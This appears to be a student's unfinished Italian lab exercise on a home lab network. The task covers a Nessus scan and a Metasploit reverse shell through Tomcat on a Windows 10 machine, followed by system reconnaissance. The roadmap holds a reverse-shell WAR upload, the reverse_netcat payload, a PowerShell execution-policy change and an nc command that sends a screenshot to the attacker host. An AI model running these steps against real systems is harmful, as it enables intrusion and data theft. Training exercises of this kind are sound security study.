@@ -1,0 +1,43 @@
+--- TRACCIA 5 ----
+Ip 1: 192.168.200.100/24
+Ip 2: 192.168.200.200/24
+
+Indicazioni:
+- Avviare questi servizi 
+- Effettuare un Vulnerability Scanning (basic scan) con Nessus sulla macchina Windows 10 
+- Aprire una sessione con metasploit, exploitando il servizio TomCat.
+- Porta in ascolto 7777
+
+Obiettivi:
+1. Scoprire se la macchina è una macchina virtuale o una macchina fisica
+2. Impostazioni di rete macchina target
+3. Se la macchina virtuale ha a disposizione webcam attive
+4. Recuperare uno screenshot del desktop
+
+---- Promemoria ---- 
+- TC Versione: http    Apache Tomcat/Coyote JSP engine 1.1 /7.0.81
+- TC port: 8080
+
+
+
+-----------------------------------
+
+
+
+Roadmap:
+1. nmap vuln scan
+2. avvio servizio tomcat su Windows 10
+3. Accedo al server dalla macchina linux per vedere la versione precisa di Tomcat
+4. Entro nel server e carico l'acrhivio con la reverse shell (shell.war)
+5. Sul framework di metasploit utilizzo il payload payload/cmd/unix/reverse_netcat
+6. Connessione accettata (foto 1)
+7. Impostazioni di rete con ifconfig (foto 1)
+8. Scoprire se la macchina è una virtual machine con il comando systeminfo (foto 2)
+9. Ho scoperto che la macchina in se non usa una webcam con driverquery | findstr /i "camera" (foto 3)
+10. Prendiamo i permessi di execution della shell con questo commando:
+    powershell -Command "Set-ExecutionPolicy Unrestricted -Scope CurrentUser"
+11. Controlliamo se abbiamo i permessi con questo commando:
+    powershell -Command "Get-ExecutionPolicy"
+12. nc 192.168.200.100 7777 < C:\Users\Public\screenshot.png
+
+[DA FINIRE MI SONO BLOCCATO SUL TRASFERIMENTO DELLO SCREENSHOT]
